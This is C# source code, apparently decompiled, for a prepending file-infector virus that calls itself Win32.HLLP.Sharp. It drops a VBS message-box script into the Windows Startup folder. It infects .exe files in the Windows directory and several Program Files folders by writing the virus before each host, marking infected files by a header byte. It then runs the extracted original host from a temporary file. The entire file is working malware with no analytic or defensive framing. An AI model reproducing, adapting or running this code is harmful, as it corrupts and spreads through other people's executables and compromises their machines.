using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace Sharp;

public class Sharp
{
	private static string virname = (string)Registry.LocalMachine.OpenSubKey("Software\\Sharp")!.GetValue("");

	[STAThread]
	private static void Main()
	{
		string fullName = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).FullName;
		FileInfo fileInfo = new FileInfo(fullName + "\\Sharp.vbs");
		StreamWriter streamWriter = fileInfo.CreateText();
		streamWriter.Write("MsgBox \"You're infected with Win32.HLLP.Sharp, written in C#, by Gigabyte/Metaphase\",64,\"title\"");
		streamWriter.Close();
		string fullName2 = new DirectoryInfo(Environment.SystemDirectory).Parent!.FullName;
		string fullName3 = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)).FullName;
		string[] directories = Directory.GetDirectories(fullName3, "*.*");
		FileSearch(fullName2);
		FileSearch(directories[11]);
		FileSearch(directories[12]);
		FileSearch(directories[13]);
		FileStream fileStream = new FileStream(virname, FileMode.Open, FileAccess.Read);
		FileStream fileStream2 = new FileStream("temp.exe", FileMode.OpenOrCreate);
		byte[] buffer;
		checked
		{
			buffer = new byte[(uint)unchecked((int)fileStream.Length - 12288)];
			fileStream.Seek(12288L, SeekOrigin.Begin);
		}
		fileStream.Read(buffer, 0, (int)fileStream.Length - 12288);
		fileStream2.Write(buffer, 0, (int)fileStream.Length - 12288);
		long length = fileStream2.Length;
		fileStream2.Close();
		if (length > 0L && !virname.EndsWith("MS02-010.exe"))
		{
			Process process = new Process();
			process.StartInfo.FileName = "temp.exe";
			process.Start();
		}
		while (File.Exists("temp.exe"))
		{
			try
			{
				File.Delete("temp.exe");
			}
			catch
			{
			}
		}
	}

	private static void FileSearch(string DirectoryToCheck)
	{
		string[] files = Directory.GetFiles(DirectoryToCheck, "*.exe");
		int num = files.Length;
		for (int i = 0; i < num; i++)
		{
			string text = files[i];
			FileStream fileStream = new FileStream(text, FileMode.Open, FileAccess.Read);
			fileStream.Seek(18L, SeekOrigin.Begin);
			int num2 = fileStream.ReadByte();
			fileStream.Close();
			if (num2 != 103)
			{
				try
				{
					File.SetAttributes(text, FileAttributes.Normal);
					File.Copy(text, "hostcopy.exe", overwrite: true);
					File.Copy(virname, text, overwrite: true);
					FileStream fileStream2 = new FileStream("hostcopy.exe", FileMode.Open);
					FileStream fileStream3 = new FileStream(text, FileMode.Append);
					byte[] buffer;
					checked
					{
						buffer = new byte[(uint)unchecked((int)fileStream2.Length)];
					}
					fileStream2.Read(buffer, 0, (int)fileStream2.Length);
					fileStream3.Write(buffer, 0, (int)fileStream2.Length);
					fileStream2.Close();
					fileStream3.Close();
				}
				catch
				{
				}
			}
		}
		File.Delete("hostcopy.exe");
	}
}
